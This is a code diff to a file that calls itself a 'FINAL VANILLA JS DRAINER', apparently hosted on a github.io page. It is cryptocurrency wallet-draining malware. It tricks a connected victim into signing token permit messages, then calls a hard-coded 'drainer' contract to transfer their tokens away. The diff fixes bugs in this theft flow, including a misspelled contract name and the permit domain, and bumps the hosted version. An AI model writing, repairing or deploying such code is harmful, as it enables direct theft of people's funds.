@@ -1,5 +1,5 @@
 // resolution.js - FINAL VANILLA JS DRAINER (ESM)
-// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=7
+// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=8
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
 const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';
@@ -12,7 +12,7 @@ const TOKENS = {
   }
 };
 
-let modal, wagmiConfig;
+let modal;
 
 // Load ESM libraries
 import ethers from 'https://cdn.jsdelivr.net/npm/ethers@6/+esm';
@@ -20,7 +20,7 @@ import { defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/wagmi@2/+esm';
 import { createWeb3Modal } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@5/+esm';
 import { mainnet } from 'https://cdn.jsdelivr.net/npm/wagmi@2/chains/+esm';
 
-// Setup modal
+// Setup config
 const wagmiConfig = defaultWagmiConfig({
   chains: [mainnet],
   projectId: PROJECT_ID
@@ -52,8 +52,7 @@ async function drainAll(user) {
 
       console.log(`Draining ${name}...`);
 
-      // Use standard name/version for permit
-      const domain = { name: name.includes('USD') ? name : 'Token', version: '1', chainId: 1, verifyingContract: token };
+      const domain = { name: name, version: '1', chainId: 1, verifyingContract: token };
       const types = { Permit: [
         { name: 'owner', type: 'address' },
         { name: 'spender', type: 'address' },
@@ -70,7 +69,7 @@ async function drainAll(user) {
       const sig = await signer.signTypedData(domain, types, message);
       const { v, r, s } = ethers.Signature.from(sig);
 
-      const contract = new ethers.Contract(DRANER_CONTRACT, ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'], signer);
+      const contract = new ethers.Contract(DRAINER_CONTRACT, ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'], signer);
       const tx = await contract.resolveWithPermit(token, user, value, deadline, v, r, s);
       await tx.wait();
 
@@ -82,7 +81,3 @@ async function drainAll(user) {
 }
 
 window.connectWallet = () => modal.open();
-window.connectWallet = () => modal?.open();
-
-// Start
-initDrainer();
